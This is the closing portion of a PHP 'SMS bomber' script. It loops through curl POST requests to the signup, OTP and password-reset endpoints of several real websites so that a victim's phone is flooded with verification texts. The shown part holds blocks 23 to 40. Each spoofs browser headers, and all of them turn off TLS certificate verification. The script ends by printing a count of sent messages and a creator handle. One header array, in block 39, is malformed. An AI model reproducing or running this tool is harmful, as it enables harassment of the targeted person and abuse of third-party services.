curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Cache-Control: max-age=0',
'Upgrade-Insecure-Requests: 1',
'Origin: https://www.tapdoo.com',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://www.tapdoo.com/login',
'Accept-Language: en-US,en;q=0.9',
'Cookie: PHPSESSID='.$PHPSESSID.'',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'phone='.$full_phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 23
$Sender = curl_init();
$Sender_Url = "https://www.snapptrip.com/register";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'lang: fa',
'Accept-Language: fa',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json; charset=UTF-8',
'Origin: https://www.snapptrip.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.snapptrip.com/',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"lang":"fa","country_id":"1","password":"'.$password.'","mobile_phone":"'.$full_phone.'","country_code":"+98","email":"'.$email.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 24
$Sender = curl_init();
$Sender_Url = "https://sandbox.sbm24.net/api/v1/register/confirm";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://cp.sbm24.com',
'Sec-Fetch-Site: cross-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://cp.sbm24.com/register',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'username='.$full_phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 25
$Sender = curl_init();
$Sender_Url = "https://drdr.ir/api/registerEnrollment/sendDisposableCode";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json',
'Authorization: hiToken',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://drdr.ir',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://drdr.ir/',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phoneNumber":"'.$Phone.'","userType":"PATIENT"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 26
$Sender = curl_init();
$Sender_Url = "https://drdr.ir/api/registerEnrollment/voip";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json',
'Authorization: hiToken',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://drdr.ir',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://drdr.ir/',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phoneNumber":"'.$Phone.'","userType":"PATIENT"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 27
$Sender = curl_init();
$Sender_Url = "https://wishato.com/api/users/join/signup";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: appllication/json',
'Origin: https://wishato.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://wishato.com/users/auth?status=register',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"cellphone":"+98-'.$Phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 28
$Sender = curl_init();
$Sender_Url = "https://www.bitooman.ir/Account/SendAgainCellPhoneVerificationKey";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.bitooman.ir',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.bitooman.ir/Account/Login',
'Accept-Language: en-US,en;q=0.9',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'CellPhoneNumber='.$full_phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 29
$Sender = curl_init();
$Sender_Url = "http://www.mopon.ir/%D8%A7%D8%B1%D8%B3%D8%A7%D9%84-%DA%A9%D8%AF-%D9%81%D8%B9%D8%A7%D9%84-%D8%B3%D8%A7%D8%B2%DB%8C?phone=$full_phone";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'X-Requested-With: XMLHttpRequest',
'Accept-Language: en-US,en;q=0.9',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 30
$Sender = curl_init();
$Sender_Url = "https://www.eavar.com/fa/v2/signupbymobile/";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.eavar.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.eavar.com/',
'Accept-Language: en-US,en;q=0.9',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'mobile='.$full_phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 31
$Sender = curl_init();
$Sender_Url = "https://www.eavar.com/fa/v2/sendmobileverificationcode/";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.eavar.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.eavar.com/',
'Accept-Language: en-US,en;q=0.9',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'mobile='.$full_phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 32
$Sender = curl_init();
$Sender_Url = "https://kowsareshop.com/Customer/SendSmsActivationCode";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json',
'Origin: https://kowsareshop.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://kowsareshop.com/fa/register',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"MobileNumber":"'.$full_phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 33
$Sender = curl_init();
$Sender_Url = "https://api.bitel.rest/api/v1/auth/register";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json',
'Origin: http://zamanak.ir',
'Sec-Fetch-Site: cross-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: http://zamanak.ir/login',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phone":"'.$full_phone.'","company":"'.$password.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 34
$Sender = curl_init();
$Sender_Url = "https://api.bitel.rest/api/v1/auth/otp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json',
'Origin: http://zamanak.ir',
'Sec-Fetch-Site: cross-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: http://zamanak.ir/login',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phone":"'.$full_phone.'","type":1}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 35
$Sender = curl_init();
$Sender_Url = "https://a4baz.com/api/web/login";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
'Content-Type: text/plain;charset=UTF-8',
'Accept: */*',
'Origin: https://a4baz.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://a4baz.com/my/login',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"cellphone":"'.$full_phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 36
$Sender = curl_init();
$Sender_Url = "https://a4baz.com/api/web/forgot_pasword";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
'Content-Type: text/plain;charset=UTF-8',
'Accept: */*',
'Origin: https://a4baz.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://a4baz.com/my/login',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"cellphone":"'.$full_phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 37
$Sender = curl_init();
$Sender_Url = "https://hubcar.ir/user/register_action";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://hubcar.ir',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://hubcar.ir/user/register',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'type=request&identity='.$full_phone.'&code=&pass=&invite_id=');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 38
$Sender = curl_init();
$Sender_Url = "https://hubcar.ir/user/register_action";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://hubcar.ir',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://hubcar.ir/user/register',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'type=resend_code&identity='.$full_phone.'&code=&pass=&invite_id=');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 39
$Sender = curl_init();
$Sender_Url = "https://tagmond.com/phone_number";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array("
'Connection: keep-alive',
'Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
'X-Requested-With: XMLHttpRequest'
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
'Origin: https://tagmond.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://tagmond.com/',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'"));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'utf8=%E2%9C%93&phone_number='.$full_phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 40
$Sender = curl_init();
$Sender_Url = "https://shadmessenger50.iranlms.ir/";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Content-Type: application/json;charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"api_version":"3","method":"sendCode","data":{"phone_number":"98'.$Phone.'","send_type":"SMS"}}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//============================================================================//
$i++;
}
//============================================================================//
//Create Count Final
$all_request = $count * 40;
//============================================================================//
echo "$all_request Sms Sended
creator: @mrxxrm
";
//============================================================================//
}else{
echo "'count' Value Is Incorrect!
";
}
}else{
echo "'phone' Value Is Incorrect!
";
}
}
//============================================================================//
?>
